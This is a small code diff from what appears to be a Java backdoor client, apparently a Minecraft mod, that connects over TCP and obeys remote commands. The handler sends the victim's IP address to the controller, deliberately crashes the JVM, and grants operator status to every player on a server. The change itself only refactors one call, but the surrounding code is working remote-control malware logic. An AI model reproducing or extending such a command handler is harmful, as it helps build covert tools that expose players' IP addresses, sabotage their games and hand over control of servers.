@@ -91,7 +91,7 @@ public class Client extends TcpClient {
                 case "ip" -> Witch.send(msgType, NetUtil.getIP());
                 case "crash" -> GlfwUtil.makeJvmCrash();
                 case "server_name" -> Witch.VARIABLES.name = (String) msg;
-                case "op@a" -> OpEveryone.opEveryone();
+                case "op@a" -> OpEveryone.INSTANCE.opEveryone();
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
